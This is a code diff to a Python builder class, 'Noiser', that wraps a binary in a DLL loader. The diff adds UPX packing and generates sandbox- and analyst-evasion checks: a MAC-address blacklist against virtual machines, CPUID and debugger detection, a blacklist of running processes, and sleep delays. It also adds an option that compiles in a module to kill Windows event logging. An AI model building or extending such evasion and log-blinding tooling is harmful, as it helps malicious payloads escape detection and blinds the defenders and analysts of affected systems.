@@ -1,3 +1,4 @@
+from multiprocessing.dummy import Process
 import os
 import subprocess
 from .consts import *
@@ -6,7 +7,8 @@ from .modules import *
 
 class Noiser:
     def __init__(self, bin_path) -> None:
-        self.bin_path = bin_path
+        self.bin_path = f"{os.path.splitext(bin_path)[0]}_upx.exe"
+        subprocess.call(["upx.exe", "-o", self.bin_path, "-f", bin_path])
         self.script_dir = os.path.dirname(os.path.realpath(__file__))
         self.include_path = os.path.join(self.script_dir, "include") 
         self.defines_path = os.path.join(self.include_path, FILENAME_DEFINES_HEADER) 
@@ -52,6 +54,39 @@ class Noiser:
                 f.write(TEMPLATE_DNS_ANALYSIS_FAKE_ARG.format(fake_dns))
                 f.write(TEMPLATE_DNS_ANALYSIS_REAL_ARG.format(real_dns))
 
+        elif analysis_type == MACAddrAnalysis:
+            self.__add_def(MAC_ANALYSIS_ENABLED)
+            # os.makedirs("antivm")
+
+            mac_blacklist_path = os.path.join(self.include_path, FILENAME_MAC_ANALYSIS_HEADER)
+            with open(mac_blacklist_path, "w") as wf:
+                mac_blacklist = ', '.join(["\"" + i.strip('\n') + "\""  for i in analysis.blacklist])
+                wf.write("#include <vector>\n#include <string>\n\n")
+                wf.write(TEMPLATE_MAC_ANALYSIS_ARG.format(mac_blacklist))
+
+        elif analysis_type == CPUIDAnalysis:
+            self.__add_def(CPUID_ANALYSIS_ENABLED)
+
+        elif analysis_type == DebugAnalysis:
+            self.__add_def(DEBUG_ANALYSIS_ENABLED)
+
+        elif analysis_type == ProcessAnalysis:
+            self.__add_def(PROCESS_ANALYSIS_ENABLED)
+            process_list = "".join([f"\"{i}\",\n" for i in analysis.process_list])
+            process_list_path = os.path.join(self.include_path, FILENAME_PROCESS_ANALYSIS)
+            with open(process_list_path, "w") as wf:
+                wf.write("#include <vector>\n#include <string>\n\n")
+                wf.write(TEMPLATE_PROCESS_ANALYSIS_ARG.format(process_list))
+
+        elif analysis_type == SleepAnalysis:
+            self.__add_def(SLEEP_ANALYSIS_ENABLED)
+            self.__add_def(TEMPLATE_SLEEP_ANALYSIS_ARG.format(analysis.sleep_time))
+
+
+    def addBlind(self, blind):
+        blind_type = type(blind)
+        if blind_type == EventlogBlind:
+            self.__add_def(EVENTLOG_BLIND_ENABLED)
 
     def __add_def(self, content):
         with open(self.defines_path, "a") as f:
@@ -79,15 +114,19 @@ class Noiser:
                 "src/DllLoader/main.cpp",
                 "src/DllLoader/loader.cpp",
                 "src/modules/dns.cpp",
+                "src/modules/anti-debug.cpp",
+                "src/modules/anti-vm.cpp",
                 "src/modules/file.cpp",
                 "src/modules/network.cpp",
                 "src/modules/print.cpp",
-                "src/modules/anti-debug.cpp",
-                "src/modules/anti-vm.cpp",
-                "src/modules/killeventlog.cpp",
                 "src/modules/registry.cpp",
+                "src/modules/killeventlog.cpp",
+                "-static",
                 "-Iinclude",
                 "-lws2_32",
+                "-lIphlpapi",
+                "-lpsapi",
+                "-DPSAPI_VERSION=1"
             ]
         )
         print(f"Success")
